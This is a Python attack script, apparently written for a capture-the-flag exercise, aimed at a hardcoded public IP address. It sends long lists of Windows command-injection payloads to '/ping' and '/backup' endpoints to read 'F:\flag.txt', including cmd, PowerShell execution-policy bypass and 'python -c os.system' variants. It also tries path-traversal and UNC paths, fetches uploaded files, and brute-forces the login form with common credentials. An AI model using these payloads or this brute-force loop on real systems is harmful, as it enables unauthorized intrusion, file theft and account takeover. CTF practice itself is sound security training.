import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_ping_windows_commands():
    """测试Ping命令执行（Windows命令格式）"""
    print_section("1. 测试Ping命令执行（Windows命令格式）")
    
    ping_url = f"{TARGET}/ping"
    
    # Windows命令格式测试
    ping_payloads = [
        # Windows特有命令
        "127.0.0.1 & whoami",
        "127.0.0.1 & type F:\\flag.txt",
        "127.0.0.1 && whoami",
        "127.0.0.1 && type F:\\flag.txt",
        "127.0.0.1 | whoami",
        "127.0.0.1 | type F:\\flag.txt",
        # 使用cmd /c
        "127.0.0.1; cmd /c whoami",
        "127.0.0.1; cmd /c type F:\\flag.txt",
        "127.0.0.1; cmd /c \"type F:\\flag.txt\"",
        # 使用call
        "127.0.0.1; call whoami",
        "127.0.0.1; call type F:\\flag.txt",
        # 使用start
        "127.0.0.1; start /b whoami",
        "127.0.0.1; start /b type F:\\flag.txt",
        # 使用powershell
        "127.0.0.1; powershell -Command whoami",
        "127.0.0.1; powershell -Command \"type F:\\flag.txt\"",
        "127.0.0.1; powershell -ExecutionPolicy Bypass -Command \"type F:\\flag.txt\"",
        # 使用python
        "127.0.0.1; python -c \"print(open('F:\\flag.txt').read())\"",
        "127.0.0.1; python -c \"__import__('os').system('type F:\\flag.txt')\"",
        # 使用python3
        "127.0.0.1; python3 -c \"print(open('F:\\flag.txt').read())\"",
        # 使用py
        "127.0.0.1; py -c \"print(open('F:\\flag.txt').read())\"",
        # 使用不同的分隔符
        "127.0.0.1 , whoami",
        "127.0.0.1 , type F:\\flag.txt",
        # 使用括号
        "(127.0.0.1)",
        "(127.0.0.1) & whoami",
        "(127.0.0.1) && type F:\\flag.txt",
        # 使用引号
        "\"127.0.0.1\"",
        "\"127.0.0.1\" & whoami",
        "'127.0.0.1'",
        "'127.0.0.1' & whoami",
        # 尝试不带IP
        "& whoami",
        "& type F:\\flag.txt",
        "&& whoami",
        "&& type F:\\flag.txt",
        "| whoami",
        "| type F:\\flag.txt",
        # 使用重定向
        "127.0.0.1 > temp.txt",
        "127.0.0.1 >> temp.txt",
        # 使用管道
        "127.0.0.1 | find \"flag\"",
        "127.0.0.1 | more",
        # 使用环境变量
        "127.0.0.1; echo %USERNAME%",
        "127.0.0.1; echo %COMPUTERNAME%",
        "127.0.0.1; echo %SYSTEMROOT%",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_backup_windows_commands():
    """测试Backup命令执行（Windows命令格式）"""
    print_section("2. 测试Backup命令执行（Windows命令格式）")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        # Windows命令格式
        "F:\\small peoject\\python-lab\\uploads & whoami",
        "F:\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads && whoami",
        "F:\\small peoject\\python-lab\\uploads && type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads | whoami",
        "F:\\small peoject\\python-lab\\uploads | type F:\\flag.txt",
        # 使用cmd /c
        "F:\\small peoject\\python-lab\\uploads; cmd /c whoami",
        "F:\\small peoject\\python-lab\\uploads; cmd /c type F:\\flag.txt",
        # 使用powershell
        "F:\\small peoject\\python-lab\\uploads; powershell -Command whoami",
        "F:\\small peoject\\python-lab\\uploads; powershell -Command \"type F:\\flag.txt\"",
        # 使用python
        "F:\\small peoject\\python-lab\\uploads; python -c \"print(open('F:\\flag.txt').read())\"",
        # 使用不同的路径格式
        "F:/small peoject/python-lab/uploads",
        "F:/small peoject/python-lab/uploads & whoami",
        "F:/small peoject/python-lab/uploads & type F:\\flag.txt",
        # 使用相对路径
        ".",
        "..",
        "../..",
        "../../..",
        # 使用UNC路径
        "\\\\localhost\\F$\\small peoject\\python-lab\\uploads",
        "\\\\localhost\\F$\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
        # 使用环境变量
        "%SYSTEMDRIVE%\\small peoject\\python-lab\\uploads",
        "%SYSTEMDRIVE%\\small peoject\\python-lab\\uploads & type F:\\flag.txt",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_uploaded_files_content():
    """测试上传文件的内容"""
    print_section("3. 测试上传文件的内容")
    
    # 从之前的测试发现，上传的文件可以包含Python代码
    # 让我检查这些文件是否包含敏感信息
    
    uploaded_files = [
        "/uploads/29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "/uploads/8980c085b13144f8b1c0343bca7b5a77.gif",
        "/uploads/cdabc3ae7c8a47c7b8be4cef644cfe57.gif",
        "/uploads/de752ae2fdf248c1a454f217e4dc0413.gif",
        "/uploads/aaa3e372897641cda19c2461257afa03.gif",
        "/uploads/0f9a74c0d29b49bb91f91c739349a426.gif",
        "/uploads/1d0e01aa262d4d5c8beade68c208d3ed.gif",
        "/uploads/75b16cf4c67b4e00a6beaf866264a93e.gif",
        "/uploads/95a712ca89e04c56a8211295c23575fa.gif",
    ]
    
    for path in uploaded_files:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.content
                
                # 检查是否包含flag
                content_str = content.decode('utf-8', errors='replace')
                flag_match = re.search(r'flag\{[^}]+\}', content_str, re.IGNORECASE)
                if flag_match:
                    print(f"\n  🚩 FLAG FOUND in {path}: {flag_match.group(0)}")
                    return
                
                # 检查是否包含敏感信息
                if len(content_str) > 100:
                    print(f"\n  [{r.status_code}] {path}")
                    print(f"     内容: {content_str[:300]}")
                    
        except Exception as e:
            print(f"  错误: {e}")


def test_brute_force_login():
    """测试登录暴力破解"""
    print_section("4. 测试登录暴力破解")
    
    url = f"{TARGET}/login"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 根据上传目录文件名和提示猜测凭据
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "ctf"),
        ("admin", "term3lab"),
        ("admin", "flag"),
        ("admin", "test"),
        ("admin", "python"),
        ("admin", "lab"),
        ("admin", "term3"),
        ("admin", "security"),
        ("admin", "defense"),
        ("admin", "attack"),
        ("admin", "bug"),
        ("admin", "123"),
        ("admin", "admin123"),
        ("root", "root"),
        ("root", "password"),
        ("root", "123456"),
        ("user", "user"),
        ("user", "password"),
        ("user", "123456"),
        ("test", "test"),
        ("demo", "demo"),
        ("guest", "guest"),
        ("lab", "lab"),
        ("term3", "term3"),
        ("term3", "123456"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "用户名或密码错误" not in r.text:
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {r.text[:800]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                        return
                    
                    # 检查是否有重定向
                    if r.history:
                        print(f"     重定向到: {r.url}")
                        r2 = session.get(r.url, timeout=TIMEOUT)
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match2 = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match2:
                            print(f"     🚩 FLAG FOUND: {flag_match2.group(0)}")
                            return
                    return
                    
        except Exception as e:
            pass
    
    print("\n  ❌ 未找到有效凭据")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_ping_windows_commands()
    test_backup_windows_commands()
    test_uploaded_files_content()
    test_brute_force_login()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()